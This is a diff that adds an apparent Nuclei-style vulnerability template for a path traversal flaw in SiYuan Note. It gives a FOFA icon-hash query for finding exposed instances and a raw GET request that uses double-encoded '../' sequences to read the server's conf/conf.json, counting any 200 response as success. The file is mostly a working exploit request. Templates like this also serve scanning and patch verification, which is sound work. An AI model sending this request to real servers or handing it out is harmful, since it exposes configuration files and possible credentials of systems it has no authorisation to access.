@@ -1,0 +1,21 @@
+id: poc-ohfgxdp4zme8iql3
+info:
+  name: 思源笔记assets存在路径穿越漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ohfgxdp4zme8iql3'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ohfgxdp4zme8iql3
+    fofa: icon_hash="-1450125239"
+http:
+- raw:
+  - 'GET /assets/%252e%252e/%252e%252e/conf/conf.json HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
